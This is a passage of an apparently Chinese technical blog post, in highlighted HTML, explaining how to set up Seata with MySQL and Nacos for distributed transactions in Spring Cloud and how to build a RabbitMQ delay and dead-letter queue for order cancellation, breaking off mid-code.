   queryLimit = 100\n    maxWait = 5000\n  &#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<blockquote>\n<ul>\n<li>创建global_table 建表脚本在源码中的script目录去找</li>\n</ul>\n</blockquote>\n</blockquote>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> <span class=\"token keyword\">IF</span> <span class=\"token operator\">NOT</span> <span class=\"token keyword\">EXISTS</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>global_table<span class=\"token punctuation\">`</span></span>\n<span class=\"token punctuation\">(</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>xid<span class=\"token punctuation\">`</span></span>                       <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>transaction_id<span class=\"token punctuation\">`</span></span>            <span class=\"token keyword\">BIGINT</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>status<span class=\"token punctuation\">`</span></span>                    <span class=\"token keyword\">TINYINT</span>      <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>application_id<span class=\"token punctuation\">`</span></span>            <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>transaction_service_group<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>transaction_name<span class=\"token punctuation\">`</span></span>          <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>timeout<span class=\"token punctuation\">`</span></span>                   <span class=\"token keyword\">INT</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>begin_time<span class=\"token punctuation\">`</span></span>                <span class=\"token keyword\">BIGINT</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>application_data<span class=\"token punctuation\">`</span></span>          <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>gmt_create<span class=\"token punctuation\">`</span></span>                <span class=\"token keyword\">DATETIME</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>gmt_modified<span class=\"token punctuation\">`</span></span>              <span class=\"token keyword\">DATETIME</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>xid<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">KEY</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>idx_gmt_modified_status<span class=\"token punctuation\">`</span></span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>gmt_modified<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">,</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>status<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">KEY</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>idx_transaction_id<span class=\"token punctuation\">`</span></span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>transaction_id<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">ENGINE</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">InnoDB</span>\n  <span class=\"token keyword\">DEFAULT</span> <span class=\"token keyword\">CHARSET</span> <span class=\"token operator\">=</span> utf8<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<blockquote>\n<ul>\n<li>创建branch_table 建表脚本在源码中的script目录去找</li>\n</ul>\n</blockquote>\n</blockquote>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> <span class=\"token keyword\">IF</span> <span class=\"token operator\">NOT</span> <span class=\"token keyword\">EXISTS</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>branch_table<span class=\"token punctuation\">`</span></span>\n<span class=\"token punctuation\">(</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>branch_id<span class=\"token punctuation\">`</span></span>         <span class=\"token keyword\">BIGINT</span>       <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>xid<span class=\"token punctuation\">`</span></span>               <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>transaction_id<span class=\"token punctuation\">`</span></span>    <span class=\"token keyword\">BIGINT</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>resource_group_id<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>resource_id<span class=\"token punctuation\">`</span></span>       <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>branch_type<span class=\"token punctuation\">`</span></span>       <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>status<span class=\"token punctuation\">`</span></span>            <span class=\"token keyword\">TINYINT</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>client_id<span class=\"token punctuation\">`</span></span>         <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>application_data<span class=\"token punctuation\">`</span></span>  <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>gmt_create<span class=\"token punctuation\">`</span></span>        <span class=\"token keyword\">DATETIME</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>gmt_modified<span class=\"token punctuation\">`</span></span>      <span class=\"token keyword\">DATETIME</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>branch_id<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">KEY</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>idx_xid<span class=\"token punctuation\">`</span></span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>xid<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">ENGINE</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">InnoDB</span>\n  <span class=\"token keyword\">DEFAULT</span> <span class=\"token keyword\">CHARSET</span> <span class=\"token operator\">=</span> utf8<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<blockquote>\n<ul>\n<li>创建lock_table 建表脚本在源码中的script目录去找</li>\n</ul>\n</blockquote>\n</blockquote>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> <span class=\"token keyword\">IF</span> <span class=\"token operator\">NOT</span> <span class=\"token keyword\">EXISTS</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>lock_table<span class=\"token punctuation\">`</span></span>\n<span class=\"token punctuation\">(</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>row_key<span class=\"token punctuation\">`</span></span>        <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>xid<span class=\"token punctuation\">`</span></span>            <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>transaction_id<span class=\"token punctuation\">`</span></span> <span class=\"token keyword\">BIGINT</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>branch_id<span class=\"token punctuation\">`</span></span>      <span class=\"token keyword\">BIGINT</span>       <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>resource_id<span class=\"token punctuation\">`</span></span>    <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>table_name<span class=\"token punctuation\">`</span></span>     <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>pk<span class=\"token punctuation\">`</span></span>             <span class=\"token keyword\">VARCHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">36</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>gmt_create<span class=\"token punctuation\">`</span></span>     <span class=\"token keyword\">DATETIME</span><span class=\"token punctuation\">,</span>\n    <span class=\"token identifier\"><span class=\"token punctuation\">`</span>gmt_modified<span class=\"token punctuation\">`</span></span>   <span class=\"token keyword\">DATETIME</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>row_key<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token keyword\">KEY</span> <span class=\"token identifier\"><span class=\"token punctuation\">`</span>idx_branch_id<span class=\"token punctuation\">`</span></span> <span class=\"token punctuation\">(</span><span class=\"token identifier\"><span class=\"token punctuation\">`</span>branch_id<span class=\"token punctuation\">`</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">)</span> <span class=\"token keyword\">ENGINE</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">InnoDB</span>\n  <span class=\"token keyword\">DEFAULT</span> <span class=\"token keyword\">CHARSET</span> <span class=\"token operator\">=</span> utf8<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>配置上线注册到nacos得配置 在源码中的script目录去找到 config-center下得config.txt修改如下配置</p>\n</blockquote>\n<pre class=\"line-numbers language-txt\" data-language=\"txt\"><code class=\"language-txt\">store.mode=db\nstore.db.url=jdbc:mysql://127.0.0.1:3306/seata_server?useUnicode=true&amp;rewriteBatchedStatements=true\nstore.db.user=root\nstore.db.password=lqs\n\nservice.vgroupMapping.chengdu=default # vgroupMappin后面得可以随便写但是要记住这个很重要,配置客户端得时候会用到,这个default可以修改但是必须和注册中心集群名字一样 这个配置也就是集群得时候用得<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n<blockquote>\n<p>nacos得到源码中的script目录中config-center下得config.txt中的配置</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\"># 可以根据自己得需要修改这个文件</span>\n<span class=\"token function\">bash</span> config-center/nacos/nacos-config.sh<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>以上成功之后 启动seata</p>\n</blockquote>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">bash</span> bin/seata-server.sh <span class=\"token parameter variable\">-p</span> 端口 <span class=\"token parameter variable\">-n</span> 节点数量<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h3 id=\"整合seata\"><a href=\"#整合seata\" class=\"headerlink\" title=\"整合seata\"></a>整合seata</h3><blockquote>\n<p>导入Seata依赖 spring-cloud-starter-alibaba-seata 默认还对导入seata-all seata-all得版本必须和下载得seata-server版本一样</p>\n</blockquote>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token comment\">&lt;!--        seata事务协调器--></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>com.alibaba.cloud<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>spring-cloud-starter-alibaba-seata<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>配置application.properties</p>\n</blockquote>\n<pre class=\"line-numbers language-properties\" data-language=\"properties\"><code class=\"language-properties\">\n<span class=\"token key attr-name\">seata.tx-service-group</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">chengdu</span>\n<span class=\"token key attr-name\">seata.enabled</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">true</span>\n<span class=\"token key attr-name\">seata.application-id</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">$&#123;spring.application.name&#125;</span>\n<span class=\"token key attr-name\">seata.enable-auto-data-source-proxy</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">true</span>\n\n<span class=\"token key attr-name\">seata.config.type</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">nacos</span>\n<span class=\"token key attr-name\">seata.config.nacos.group</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">SEATA_GROUP</span>\n<span class=\"token key attr-name\">seata.config.nacos.server-addr</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">localhost</span>\n<span class=\"token key attr-name\">seata.config.nacos.namespace</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">mall-dev</span>\n<span class=\"token key attr-name\">seata.config.nacos.password</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">nacos</span>\n<span class=\"token key attr-name\">seata.config.nacos.username</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">nacos</span>\n\n\n<span class=\"token key attr-name\">seata.registry.type</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">nacos</span>\n<span class=\"token key attr-name\">seata.registry.nacos.group</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">SEATA_GROUP</span>\n<span class=\"token key attr-name\">seata.registry.nacos.application</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">seata-server</span>\n<span class=\"token key attr-name\">seata.registry.nacos.server-addr</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">localhost</span>\n<span class=\"token key attr-name\">seata.registry.nacos.namespace</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">mall-dev</span>\n<span class=\"token key attr-name\">seata.registry.nacos.password</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">nacos</span>\n<span class=\"token key attr-name\">seata.registry.nacos.username</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">nacos</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p>使用分布式事务 将@GlobalTransactional注解放在TM上</p>\n</blockquote>\n<blockquote>\n<p>如果TM出现异常,那么RM和TM都回滚,如果RM出现异常并且被处理(如try…catch),那么TC就感知不到,在TM中根据状态码来手动抛出异常回滚所有事务 或者GlobalTransactionContext.reload(RootContext.getXID()).rollback();手动回滚</p>\n</blockquote>\n<blockquote>\n<p>如果TM出现异常,那么RM和TM都回滚,如果RM中出现异常没有被处理,那么TC就可以感知到,并且直接回滚所有事务</p>\n</blockquote>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@GlobalTransactional</span>\n<span class=\"token annotation punctuation\">@Transactional</span><span class=\"token punctuation\">(</span>readOnly <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span>\n<span class=\"token annotation punctuation\">@Override</span>\n<span class=\"token keyword\">public</span> <span class=\"token class-name\">SubmitOrderResponseVo</span> <span class=\"token function\">submitOrder</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">OrderSubmitVo</span> orderSubmitVo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token class-name\">SubmitOrderResponseVo</span> submitOrderResponse<span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SubmitOrderResponseVo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    orderSubmitVoThreadLocal<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>orderSubmitVo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token class-name\">AccountRespTo</span> account<span class=\"token operator\">=</span><span class=\"token class-name\">UserLoginInterceptor</span><span class=\"token punctuation\">.</span>user<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 验证令牌</span>\n    <span class=\"token class-name\">String</span> orderToken<span class=\"token operator\">=</span>orderSubmitVo<span class=\"token punctuation\">.</span><span class=\"token function\">getOrderToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"柔性事务-可靠消息-最终一致性方案-RabbitMQ\"><a href=\"#柔性事务-可靠消息-最终一致性方案-RabbitMQ\" class=\"headerlink\" title=\"柔性事务-可靠消息+最终一致性方案(RabbitMQ)\"></a>柔性事务-可靠消息+最终一致性方案(RabbitMQ)</h3><blockquote>\n<p>我们使用这个方式来处理保存订单和锁定库存得分布式事务业务,使用延时队列来做,无论是下单失败还是锁定库存失败,通过延时队列,最终都会以补偿得方式回滚,交换机最好用Topic模式<br>,如果要使用这个模式,最好还是数据表不要太单一,比如我们系统里有库存表,库存工作单表,库存工作单详情表,订单表这些表具有明确得指向性,比如,我们知道库存表一张表,如果锁定了库存,<br>我们并不知道究竟是哪个用户锁定了库存,如果有工作单和详情单,我们就可以知道谁锁定了库存锁定了多少,再配合mq得消息,就可以准确得解锁.当然也可以不建立这些表,通过发送得mq信息来解锁.</p>\n</blockquote>\n<blockquote>\n<p>延时队列</p>\n</blockquote>\n<blockquote>\n<blockquote>\n<p>延时队列:给队列设置一个ttl,到了指定得ttl里面得消息就会变成死信,这个被设置了ttl得就是延时队列,不能被消费者监听</p>\n</blockquote>\n</blockquote>\n<blockquote>\n<blockquote>\n<p>死信:就是延时队列中过期得信息,死信在通过交换机发送给另外一个队列,只要有消费者来监听这个队列就可以获取这个死信来执行对应得业务</p>\n</blockquote>\n</blockquote>\n<blockquote>\n<p>我们系统得<code>保存订单和锁定库存得分布式事务业务</code><br><img src=\"https://pub-pce.oss-cn-chengdu.aliyuncs.com/somgWebImageSingleGenerate/2023-01-26/ae981d0870da45cb8d2269487437db23.png\"><br><img src=\"https://pub-pce.oss-cn-chengdu.aliyuncs.com/somgWebImageSingleGenerate/2023-01-26/920150f3ec1046cd93ee69c17d3908e6.png\"></p>\n</blockquote>\n<blockquote>\n<p>延时队列示例</p>\n</blockquote>\n<blockquote>\n<blockquote>\n<p>配置文件</p>\n</blockquote>\n</blockquote>\n<pre class=\"line-numbers language-properties\" data-language=\"properties\"><code class=\"language-properties\"><span class=\"token comment\"># 开启发送端确认，消息抵达交换机的确认，属于生产者确认</span>\n<span class=\"token key attr-name\">spring.rabbitmq.publisher-confirm-type</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">simple</span>\n<span class=\"token comment\"># 开启发送端消息抵达队列的确认，属于生产者确认</span>\n<span class=\"token key attr-name\">spring.rabbitmq.publisher-returns</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">true</span>\n<span class=\"token comment\"># 只要抵达队列，以异步发送优先回调,属于生产者配置</span>\n<span class=\"token key attr-name\">spring.rabbitmq.template.mandatory</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">true</span>\n\n<span class=\"token comment\"># 设置消费端手动签收</span>\n<span class=\"token key attr-name\">spring.rabbitmq.listener.direct.acknowledge-mode</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">manual</span>\n<span class=\"token comment\"># 设置消费端手动签收</span>\n<span class=\"token key attr-name\">spring.rabbitmq.listener.simple.acknowledge-mode</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">manual</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<blockquote>\n<p>代码</p>\n</blockquote>\n</blockquote>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token annotation punctuation\">@Configuration</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">OrderAutoCancelPublisher</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">></span></span> <span class=\"token punctuation\">&#123;</span>\n\n\n    <span class=\"token annotation punctuation\">@Autowired</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">RabbitTemplate</span> rabbitClient<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">sendOrderCancelTimeDelayMessage</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span> message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token comment\">/**\n         * 发消息的时候写好发给哪个交换机，发给哪个route-key，要发送的消息就行了\n         */</span>\n        rabbitClient<span class=\"token punctuation\">.</span><span class=\"token function\">convertAndSend</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_EXCHANGE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_TIME_DELAY_QUEUE_ROUTE_KEY</span><span class=\"token punctuation\">,</span> message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">sendOrderCancelEdTimeDelayMessage</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span> message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token comment\">/**\n         * 发消息的时候写好发给哪个交换机，发给哪个route-key，要发送的消息就行了\n         */</span>\n        rabbitClient<span class=\"token punctuation\">.</span><span class=\"token function\">convertAndSend</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_EXCHANGE</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_ED_RELEASE_WARE_STOCK_ROUTE_KEY</span><span class=\"token punctuation\">,</span> message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// 创建队列和交换机以及绑定关系</span>\n\n    <span class=\"token comment\">/**\n     * 创建交换机,这个交换机上面绑定一个延时队列和一个普通队列\n     * 这个交换机用于绑定订单得延时队列和订单得死信队列   死信(延时队列过期得信息)\n     * @return\n     */</span>\n    <span class=\"token annotation punctuation\">@Bean</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Exchange</span> <span class=\"token function\">orderCancelExchange</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TopicExchange</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constant</span><span class=\"token punctuation\">.</span><span class=\"token constant\">ORDER_CANCEL_EXCHANGE</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * 创建库存得延时队列,配置项:\n     *  这个队列和上面得交换机链接,只要订单保存成功就发送消息到这个队列\n     *  延时到期绑定哪一个交换机\n     *  延时到期绑定哪一个routeKey\n     *  延时时间 毫秒\n     *\n     * @return\n     */</span>\n    <span class=\"token annotation punctuation\">@Bean</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Queue</span> <span class=\"token function\">orderCancelTimeDelayQueue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> args <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span 